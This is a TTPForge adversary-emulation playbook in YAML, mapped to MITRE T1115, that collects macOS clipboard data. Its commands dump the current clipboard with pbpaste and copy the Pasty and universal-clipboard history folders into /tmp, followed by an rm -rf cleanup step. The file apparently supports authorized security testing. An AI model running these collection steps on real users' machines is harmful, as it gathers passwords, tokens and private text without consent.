---
api_version: 2.0
uuid: a9945777-a2f2-4548-9aa8-0210292218a7
name: Collect Clipboard Contents
authors:
- TTPForge
description: |
  Collect clipboard data and clipboard history from macOS system
mitre:
  tactics:
  - TA0009 Collection
  techniques:
  - T1115 Clipboard Data
requirements:
  platforms:
  - os: darwin
args:
- name: output_path
  description: Output path for clipboard data
  type: string
  default: /tmp/clipboard_data
- name: history_depth
  description: Number of clipboard history items to capture
  type: integer
  default: 50
steps:
- name: Create output directory
  inline: mkdir -p {{ .Args.output_path }}
- name: Capture current clipboard content
  inline: pbpaste > {{ .Args.output_path }}/clipboard_current.txt 2>/dev/null || echo "Clipboard empty"
- name: Collect Pasty clipboard history
  inline: |
    if [ -d "$HOME/Library/Application Support/Pasty" ]; then
      cp -r "$HOME/Library/Application Support/Pasty" "{{ .Args.output_path }}/pasty_history" 2>/dev/null || true
    fi
- name: Check for clipboard sync
  inline: |
    if [ -d "$HOME/Library/Saved Application State/com.apple.universalclipboard" ]; then
      cp -r "$HOME/Library/Saved Application State/com.apple.universalclipboard" "{{ .Args.output_path }}/universal_clipboard" 2>/dev/null || true
    fi
- name: Verify clipboard collection
  inline: ls -lah {{ .Args.output_path }}/
  cleanup:
    inline: |-
      rm -rf {{ .Args.output_path }}
      test ! -d {{ .Args.output_path }} && echo "Clipboard cleanup completed"
tests:
- name: dry_run_test
  dry_run: true
